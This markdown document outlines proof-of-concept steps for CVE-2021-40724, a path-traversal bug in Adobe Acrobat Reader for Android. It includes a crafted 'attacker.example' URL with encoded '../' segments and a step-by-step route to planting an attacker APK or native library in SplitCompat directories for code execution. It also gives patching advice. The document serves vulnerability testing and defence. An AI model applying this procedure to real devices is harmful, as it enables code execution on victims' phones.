# PoCs for Adobe Acrobat Reader for Android 21.7.0.18750

This document outlines high‑level proof‑of‑concept ideas for CVE‑2021‑40724. It does **not** include weaponized exploit code, but describes the structure and conditions needed to exercise the vulnerability in a test environment.

## CVE‑2021‑40724 — Path Traversal → Code Execution

### Overview

CVE‑2021‑40724 is a path‑traversal vulnerability in Adobe Acrobat Reader for Android (package `com.adobe.reader`) that affects versions **21.8.0 and earlier** (fixed in 21.9.0). This APK (21.7.0.18750) is therefore vulnerable.

Per Adobe and public research, a specially crafted URL or link processed by Adobe Reader causes a file to be written outside the intended directory via `..` path traversal. When combined with Google Play Core's SplitCompat dynamic code loading, this allows an attacker to place an APK / native library under the app's private `splitcompat` area where it will be loaded automatically, achieving code execution.

### Prerequisites / environment

- Vulnerable Adobe Acrobat Reader for Android installed (≤ 21.8.0, here 21.7.0.18750).
- Device or emulator with Google Play services / Play Store support (for Play Core splitcompat behavior).
- Ability to deliver a link or PDF that the victim opens in Adobe Reader (e.g., via email, chat, or browser `VIEW` intent).

### High‑level PoC idea 1 — Demonstrating path traversal write

Goal: Show that opening a crafted URL via Adobe Reader causes a file to be written to an unexpected location under `/data/data/com.adobe.reader/files/` using `..` segments.

1. **Craft a malicious URL**
   - Based on public write‑ups, the vulnerable code takes `Uri.getLastPathSegment()` from a link and uses it as a filename without sanitization.
   - Construct a URL whose last path segment URL‑encodes `../..` etc., for example:
     - `https://attacker.example/download?f=..%2F..%2Ffile.pdf` (exact format will depend on the real vulnerable parameter; see the public hulkvision blog for concrete patterns).
   - Ensure that when decoded, the last path segment becomes something like `../../pocfile.bin`.

2. **Set up a simple HTTPS server** (or HTTP if accepted by the app)
   - When the above URL is requested, serve a small dummy PDF or binary file.

3. **Trigger Adobe Reader to download the file**
   - Deliver the malicious link to the device.
   - Open it so that Android presents it to Adobe Reader (e.g., via `Intent.ACTION_VIEW` in an instrumented PoC app, or by tapping the link in a browser and choosing Adobe Reader).

4. **Observe on a rooted device / emulator**
   - After the download completes, inspect:
     - `/data/data/com.adobe.reader/files/`
     - Any `splitcompat` subdirectories, e.g.: `/data/data/com.adobe.reader/files/splitcompat/<id>/verified-splits/`.
   - Verify that a file has been created in a location that includes `../..` traversal (e.g., a filename outside the expected subfolder, or under a sensitive directory) consistent with the crafted path.

A successful PoC here demonstrates the path‑traversal write primitive, even without code execution.

### High‑level PoC idea 2 — Leveraging SplitCompat to execute attacker code

Goal: Use the traversal bug to place an APK or native library where Google Play Core's SplitCompat mechanism automatically loads it, thus executing attacker code in the app context.

> **Warning:** This is inherently dangerous and should only be attempted in a controlled test environment.

1. **Study SplitCompat file layout**
   - Install the vulnerable app and have it download some dynamic module (e.g., a feature that triggers Play Core).
   - On a rooted/emulator device, inspect:
     - `/data/data/com.adobe.reader/files/splitcompat/` and child directories.
   - Confirm the structure used for `verified-splits/` and `native-libraries/` as documented in public research.

2. **Prepare a minimal attacker APK**
   - Build an Android application whose classes have a known side effect when loaded (e.g., logging to `Logcat`, sending a benign network request to your test server, or writing to a world‑readable file).
   - Sign the APK in any valid way (Play Core will not enforce store signature here when loaded from splitcompat at runtime).

3. **Craft traversal paths targeting SplitCompat**
   - Using the vulnerable URL parameter, create paths that cause Adobe Reader to write under:
     - `/data/data/com.adobe.reader/files/splitcompat/<id>/verified-splits/attacker.apk` or
     - `/data/data/com.adobe.reader/files/splitcompat/<id>/native-libraries/arm64-v8a/libattacker.so`
   - The exact `<id>` and directory naming can be inferred from observing a legitimate dynamic module download.

4. **Trigger the vulnerable download repeatedly**
   - Call the crafted URL multiple times if necessary until the attacker APK or .so is written to the desired location.

5. **Trigger SplitCompat loading**
   - Relaunch Adobe Reader or trigger a feature that causes Play Core to rescan and load splits / native libraries from the `splitcompat` directories.
   - If the PoC succeeds, your malicious code inside the APK or `.so` will run.
   - Confirm by watching `logcat` for your specific marker, or by checking for the side effect you coded (e.g., file creation or outbound network request).

This demonstrates that the traversal bug can be escalated to code execution, matching the impact described for CVE‑2021‑40724.

### High‑level PoC idea 3 — Safer variant: information‑disclosure via path traversal

Even without SplitCompat abuse, a tester might attempt to overwrite or create files in locations readable by the app to demonstrate impact:

1. Aim the traversal write at locations such as:
   - `/data/data/com.adobe.reader/shared_prefs/` (e.g., drop a dummy XML and observe it is parsed).
   - A location under external storage where other apps or the user can read the file.

2. After triggering the vulnerable download, read back or observe the newly created file via:
   - Another app with storage permissions.
   - `adb` on an emulator.

If successful, this demonstrates the ability to control where the file is written (beyond the intended directory) and can be used to argue file‑system impact.

### Hardening / mitigation notes (defender perspective)

- Ensure Adobe Acrobat Reader for Android is updated to **21.9.0 or later**, which Adobe states patches CVE‑2021‑40724.
- On managed devices, use MDM/EMM policies to block or flag Reader versions below 21.9.0.
- Monitor for unusual outbound connections or suspicious URLs being opened by Adobe Reader.

### Disclaimer

The above PoC descriptions are derived from publicly available information (Adobe bulletin APSB21‑89 and independent researcher write‑ups about CVE‑2021‑40724). They are intended for controlled testing and validation of patch status, not for exploitation in production environments.
